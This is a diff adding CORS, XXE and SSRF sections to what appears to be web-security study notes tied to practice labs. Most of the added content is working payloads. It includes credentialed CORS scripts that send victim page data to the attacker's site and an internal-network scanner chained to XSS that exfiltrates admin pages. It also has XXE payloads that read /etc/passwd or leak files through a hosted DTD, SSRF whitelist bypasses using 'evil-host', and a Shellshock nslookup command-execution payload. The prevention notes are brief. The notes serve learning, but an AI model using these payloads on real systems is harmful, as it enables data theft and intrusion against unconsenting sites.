@@ -612,36 +612,336 @@ There is also DOM clobbering, same goal, different approach, your goal here is t
 
 ## Cross-origin resource sharing (CORS)
 
+Cross-origin resource sharing is a browser mechanism which enables controlled access to resources located outside of a given domain.  It can provide an attack vector to cross-domain based attacks, if a website's CORS policy is poorly configured and implemented. 
 
+To check for the Access-Control-Allow-Origin value you can send a request including the following header:
+`Origin: WEBSITE`
 
-- CORS vulnerability with basic origin reflection
-- CORS vulnerability with trusted null origin
-- CORS vulnerability with trusted insecure protocols
-- CORS vulnerability with internal network pivot attack
+The presence of Access-Control-Allow-Credentials is a good indicator of potential CORS.
+
+#### Some examples
+
+- Basic origin reflection
+
+	On your website you can place a script looking like this one : 
+	
+	```javascript
+	<script>  
+	 var req = new XMLHttpRequest();  
+	 req.onload = reqListener;  
+	 req.open('get','FULL_URL_TO_TARGET',true);  
+	 req.withCredentials = true;  
+	 req.send();  
+
+	 function reqListener() {  
+	 location='/log?key='+this.responseText;  
+	 };  
+	</script>
+     ```
+	 
+	 This script will fetch the FULL_URL_TO_TARGET page using the Access-Control-Allow-Credentials header. Then when the page will be loaded, it will take the page data  and send it back to you on your website.
+	 
+	 
+- Trusted null origin
+
+	Basicly this is the same as the previous one, just include the ifram with sandbox options => `sandbox="allow-scripts allow-top-navigation allow-forms"`
+
+	```javascript
+	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>  
+	 var req = new XMLHttpRequest ();  
+	 req.onload = reqListener;  
+	 req.open('get','FULL_URL_TO_TARGET',true);  
+	 req.withCredentials = true;  
+	 req.send();  
+
+	 function reqListener() {  
+	 location='YOUR_WEBSITE/log?key='+encodeURIComponent(this.responseText);  
+	 };  
+	</script>"></iframe>
+	```
+	
+	
+- Internal network pivot attack
+
+	This one is the trickier, it will follow these steps:
+	
+	1. Scan for endpoint in the internal network, it will fetch a XSS on the scanned page, your website log should include port and the corresponding ip.
+	
+		```javascript
+		<script>
+		var q = [], collaboratorURL = 'YOURWEBSITE';
+		for(i=1;i<=255;i++){
+		  q.push(
+		  function(url){
+			return function(wait){
+			fetchUrl(url,wait);
+			}
+		  }('http://192.168.0.'+i+':8080'));
+		}
+		for(i=1;i<=20;i++){
+		  if(q.length)q.shift()(i*100);
+		}
+		function fetchUrl(url, wait){
+		  var controller = new AbortController(), signal = controller.signal;
+		  fetch(url, {signal}).then(r=>r.text().then(text=>
+			{
+			location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+		  }
+		  ))
+		  .catch(e => {
+		  if(q.length) {
+			q.shift()(wait);
+		  }
+		  });
+		  setTimeout(x=>{
+		  controller.abort();
+		  if(q.length) {
+			q.shift()(wait);
+		  }
+		  }, wait);
+		}
+		</script>
+		```
+		
+		2. Then you will be able to go for XSS fetching, using information previously retrieve
+
+		```javascript
+		<script>  
+		function xss(url, text, vector) {  
+		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
+		}  
+
+		function fetchUrl(url, collaboratorURL){  
+		 fetch(url).then(r=>r.text().then(text=>  
+		 {  
+		 xss(url, text, '"><img src='+collaboratorURL+'?isXSS=1>');  
+		 }  
+		 ))  
+		}  
+
+		fetchUrl("http://IP_FOUND", "YOURWEBSITE");  
+		</script>
+		```
+
+		3. From the previous step, you will locate a potential XSS, if you find one it would be display in your website logs using `isXSS=1`. In this part we will go for the XSS exploit and retrieve the web page content.
+
+		```javascript
+		<script>  
+		function xss(url, text, vector) {  
+		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
+		}  
+		function fetchUrl(url, collaboratorURL){  
+		 fetch(url).then(r=>r.text().then(text=>  
+		 {  
+		 xss(url, text, '"><iframe src=/admin onload="new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');  
+		 }  
+		 ))  
+		}  
+
+		fetchUrl("http://IP_FOUND", "YOURWEBSITE");    
+		</script>
+		```
+		
+		4. Then you are free to do whatever you want, iframe injection, CSRF, ...
+	
+		
+#### How to prevent them 
+
+CORS are only present due to misconfigurations, you can use these headers to configure it correctly (and also use your brain again):
+   -	Access-Control-Allow-Origin: 
+	   -	Allow content from listed websites
+	   -	Avoid null value => cab ve exploit as we see above
+	   -	Avoid local things as you don't protect your colleagues actions
 
 
 ## XML external entity (XXE) injection
 
-- Exploiting XXE using external entities to retrieve files
-- Exploiting XXE to perform SSRF attacks
-- Blind XXE with out-of-band interaction
-- Blind XXE with out-of-band interaction via XML parameter entities
-- Exploiting blind XXE to exfiltrate data using a malicious external DTD
-- Exploiting blind XXE to retrieve data via error messages
-- Exploiting XXE to retrieve data by repurposing a local DTD
+XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one. This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications.
+
+#### Basics
+
+- External entities to retrieve files
+
+	Simple payload to retrieve a file from the filesystem
+	
+	```xml
+	<!DOCTYPE test \[ <!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM "file:///etc/passwd"> \]>
+	```
+		
+
+- Perform SSRF attacks
+
+	As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever
+	
+	```xml
+	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "http://127.0.0.1/"> \]>
+	```
+	
+
+#### Blind XXE
+
+- Out-of-band interaction
+
+	In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic.
+	
+	```xml
+	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "YOUR_DOMAIN_OR_IP"> \]>
+	```
+	
+- Out-of-band interaction via XML parameter entities
+
+	Same principle and a similar payload but two different test
+	
+	```xml
+	<!DOCTYPE stockCheck \[<!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "YOUR_DOMAIN_OR_IP"> %xxe; \]>
+	```
+	
+
+- Exfiltrate data using a malicious external DTD
+
+	First, DTD is a text file that store XML attributes and elements used by an application.
+	This exfiltration has two phases:
+	
+	1. You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload:
+		
+		```xml
+		<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
+		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'YOURDOMAIN/?log=%file;'>"> 
+		%eval;  
+		%exfil;
+		```
+	
+	
+	2. Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow : 
+
+		```xml
+		<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD_URL"> %xxe;]>
+		```
+	
+	
+	3. Now you should tcpdump or go to your website logs to view the file you want to retrieve.
+	
+- Retrieve data via error messages
+
+	This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one:
+	
+	```xml
+	<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
+	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">  
+	%eval;  
+	%exfil;
+	```
+	
+	This will throw an error containing the file you specify
+	
+- Retrieve data by repurposing a local DTD
+
+	For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is  `DTD_LOCAL_FILE` and the entity inside is called `PWNME`. The following payload is to include on the XML post data :
+	
+	```xml
+	<!DOCTYPE message [
+	<!ENTITY % local_dtd SYSTEM "file://DTD_LOCAL_FILE">
+	<!ENTITY % PWNME '
+	<!ENTITY &#x25; file SYSTEM "file://FILE_PATH_TO_RETRIEVE">
+	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+	&#x25;eval;
+	&#x25;error;
+	'>
+	%local_dtd;
+	]>
+	```
+
+
+#### Others examples
+
 - Exploiting XInclude to retrieve files
+
+	Back to basics, simple efficient payload :
+	
+	```xml
+	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://FILE_PATH_TO_RETRIEVE"/></foo>
+	```
+	
+	
 - Exploiting XXE via image file upload
 
+	For this attack you will have to prepare a SVG file containing the following payload and adapt parameters :
+	
+	```xml 
+	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://FILE_PATH_TO_RETRIEVE" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+	```
+
+	Then just upload it as an image and you should have the file data in your image display
+	
+	
+#### How to prevent them 
+
+XXE exist due to bad handle of user input or used of dangerous function in used librairie.
+The best way to prevent them is to include only necessaries functions or remove unnecessaries ones. Import ones to disable is `XInclude` and `external entities resolutions`
 
 ## Server-side request forgery (SSRF)
 
-- Basic SSRF against the local server
-- Basic SSRF against another back-end system
+In a Server-Side Request Forgery attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.
+
+![alt Server-Side Request Forgery](https://www.vaadata.com/blog/wp-content/uploads/2018/05/SSRF-EN.jpg)
+
+#### Basics
+- Local server
+
+	This attack can be perform thanks to the loopback interface. Basicly you will have to find a parameter that fetch or possibly fetch an URL and loopback on the server himself to request the api or whatever. 
+	
+	For example with the website `fanOfNothing.com`, on the page `store`, the search engine included will pass your search to the api using the following post request : `searchFor=fanOfNothing.com:8008/api/search`. So your way to access what you want to is to change the `fanOfNothing.com:8008/api/search` to for example `fanOfNothing.com/admin`. In that way the result will be the admin page and not the initial response
+	
+	
+- Against another back-end system
+
+	Basicly the same, just scan for internal APIs and then fuzz endpoint and get result on the search thing
+
+#### Bypassing filters
+
 - SSRF with blacklist-based input filter
+
+	Basicly for this you will need imagination and a good understanding of what you have in front of you. For example if 127.0.0.1 is block you can replace it by 127.1 you can double url encode strings, etc ... 
+	
+	
 - SSRF with whitelist-based input filter
+
+	This one is very well explained by portswigger so here is the essentials.
+	
+	To bypass whitelisting you can use thse following techniques :
+	-   You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
+	-   You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
+	-   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
+	-   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
+	-   You can use combinations of these techniques together.
+
+
 - SSRF with filter bypass via open redirection vulnerability
+
+	Same as the previous ones. Here is a payload example :
+	`param=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://INTERNAL_IP/WHATEVER`
+
+
+#### Blind exploitation
 - Blind SSRF with out-of-band detection
+
+	Easiest blind attack to perform. If you just want to see if SSRF is a thing on the site, bounce back on your domain / IP and tcpdump to check incoming traffic. 
+	
+	
 - Blind SSRF with Shellshock exploitation
+
+	This will principally lead to RCE, you can set the following payload (`() { :; }; /usr/bin/nslookup $(COMMAND).YOUR_DOMAIN`) on the Web agent field and exploit the SSRF as indicate in previous setps
+
+#### How to prevent them 
+
+You have several way to implement a protection for this type of attack. Here are some of them :	
+
+-	Input validation (regex, whitelist, ...)
+-	If you are using .NET, it can be expose to hex, dword, octal and mixed encoding
+-	Ensure that the domain is a trusted and valid one
+-	Configure a firewall to explicitly set legitimate flows
+-	....
+
 
 
 ## HTTP request smuggling
